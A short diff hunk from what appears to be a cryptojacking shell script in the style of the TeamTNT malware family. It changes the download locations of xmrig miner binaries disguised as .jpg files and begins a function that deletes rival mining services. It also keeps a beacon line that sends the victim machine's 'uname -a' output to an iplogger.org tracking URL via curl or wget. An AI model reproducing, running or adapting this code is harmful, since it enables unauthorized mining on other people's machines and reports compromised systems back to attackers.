@@ -25,8 +25,8 @@ VERSION=3.0
 
 $(curl -s -k https://iplogger.org/1Nuxp7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/1Nuxp7 --no-check-certificate --referer="$(uname -a)")
 
-MOxmrigMOD=http://129.211.98.236/xmr/mo/mod.jpg
-MOxmrigSTOCK=http://129.211.98.236/xmr/mo/stock.jpg
+MOxmrigMOD=https://github.com/littlAcen/moneroocean-setup/blob/main/mod.jpg
+MOxmrigSTOCK=https://github.com/littlAcen/moneroocean-setup/blob/main/stock.jpg
 
 function KILLMININGSERVICES(){
 rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
